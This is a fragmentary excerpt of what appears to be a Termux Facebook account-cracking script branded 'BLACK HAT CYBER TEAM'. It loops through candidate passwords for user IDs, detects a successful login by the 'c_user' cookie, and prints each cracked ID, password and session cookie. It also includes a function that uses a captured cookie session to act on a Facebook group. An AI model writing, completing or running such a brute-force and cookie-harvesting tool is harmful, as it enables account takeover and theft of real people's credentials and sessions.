...
def follow(self, session, coki):
        r = BeautifulSoup(session.get('https://mbasic.facebook.com/groups/679095800172232/', {
...
logo = ("""
 ...
 \033[1;93m║     \033[1;32m[✓] FACEBOK      : \033[1;34mTajul Islam Rabbi  \033[1;32m║
 ...
 \033[1;93m║  [\033[1;97m•\033[1;91m]\033[1;32m BLACK HAT CYBER TEAM   TERMUX COMMEND ZONE....          \033[1;32m ║
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print('\r\r\033[1;32m[BLACK HAT CYBER-OK💚] ' +uid+ ' | ' +ps+    '  \n[‎‎🌺]\033[0;93m COOKIE = \033[1;32m'+coki+  '  ''  \033[0;97m')
                ...
                continue
        loop+=1
        sys.stdout.write(f'\r\r%s {x}[{xr}BLACK HAT CYBER TEAM  {x}][%s|%s][OK:{xr}%s{x}]'%(H,loop,tl,len(oks))),
        sys.stdout.flush()
    except:
        pass
